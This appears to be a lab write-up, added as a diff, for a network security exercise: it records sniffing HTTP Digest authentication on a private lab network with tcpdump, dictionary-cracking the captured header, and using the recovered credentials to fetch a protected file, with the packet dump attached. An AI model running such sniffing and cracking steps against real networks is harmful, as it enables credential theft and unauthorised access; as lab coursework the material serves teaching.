@@ -1,0 +1,65 @@
+Steps:
+
+(1) Run command:
+  
+    sudo tcpdump -i ens4 -A src 192.168.15.2 and dst 192.168.15.1 > dump2.txt
+
+    on the ATTACKER side to capture packets from CLIENT to SERVER.
+
+(2) Run command:
+
+    curl http://192.168.15.2/2
+
+    to ask CLIENT to load webpage.
+
+(3) Packets captured are attached at the end of this file.
+    Extract the "Authorization" header and set corresponding values in the crack2 file.
+    Then run the crack2 to perform dictionary attack to find out the password.
+
+(4) I got the "dictionary" for attack from Internet and got the credential eventually:
+
+    username is travis15
+    password is tonight
+
+(5) Access secret file on the SERVER from ATTACKER VM using curl with HTTP Digest Auth:
+
+    curl --digest --user travis15:tonight http://192.168.15.1/secret/cheese > file2.txt
+
+    Secret file's content is stored in the file2.txt
+
+
+Packet in ASCII:
+
+12:31:33.696738 IP 192.168.15.2.60670 > 192.168.15.1.http: Flags [S], seq 2556785381, win 29200, options [mss 1460,sackOK,TS val 247611778 ecr 0,nop,wscale 7], length 0
+E..<3g@.@.h............P.er.......r............
+..A.........
+12:31:33.697907 IP 192.168.15.2.60670 > 192.168.15.1.http: Flags [.], ack 2569264831, win 229, options [nop,nop,TS val 247611779 ecr 247614481], length 0
+E..43h@.@.h............P.er..#.............
+..A...L.
+12:31:33.707645 IP 192.168.15.2.60670 > 192.168.15.1.http: Flags [P.], seq 0:90, ack 1, win 229, options [nop,nop,TS val 247611781 ecr 247614481], length 90: HTTP: HEAD /secret/cheese HTTP/1.1
+E...3i@.@.g............P.er..#.......u.....
+..A...L.HEAD /secret/cheese HTTP/1.1
+Host: 192.168.15.1
+User-Agent: curl/7.47.0
+Accept: */*
+
+
+12:31:33.710589 IP 192.168.15.2.60670 > 192.168.15.1.http: Flags [.], ack 309, win 237, options [nop,nop,TS val 247611782 ecr 247614484], length 0
+E..43j@.@.h............P.es@.#.......Q.....
+..A...L.
+12:31:33.713786 IP 192.168.15.2.60670 > 192.168.15.1.http: Flags [P.], seq 90:463, ack 309, win 237, options [nop,nop,TS val 247611783 ecr 247614484], length 373: HTTP: HEAD /secret/cheese HTTP/1.1
+E...3k@.@.f............P.es@.#.............
+..A...L.HEAD /secret/cheese HTTP/1.1
+Host: 192.168.15.1
+Authorization: Digest username="travis15", realm="Cheese", nonce="HtmwzmaXBQA=cfe89db021040491580c1340cc19d3ba22423d02", uri="/secret/cheese", cnonce="ZjFiMTJhNjJkN2RiOTUxN2UwZTc5YzBkNTQ5ODA3MzE=", nc=00000001, qop=auth, response="4b9e38225d22ef3ceaa4b1f230ab1473", algorithm="MD5"
+User-Agent: curl/7.47.0
+Accept: */*
+
+
+12:31:33.716669 IP 192.168.15.2.60670 > 192.168.15.1.http: Flags [F.], seq 463, ack 437, win 245, options [nop,nop,TS val 247611783 ecr 247614486], length 0
+E..43l@.@.h............P.et..#.s.....P.....
+..A...L.
+12:31:33.718094 IP 192.168.15.2.60670 > 192.168.15.1.http: Flags [.], ack 438, win 245, options [nop,nop,TS val 247611784 ecr 247614486], length 0
+E..43m@.@.h............P.et..#.t.....N.....
+..A...L.
+
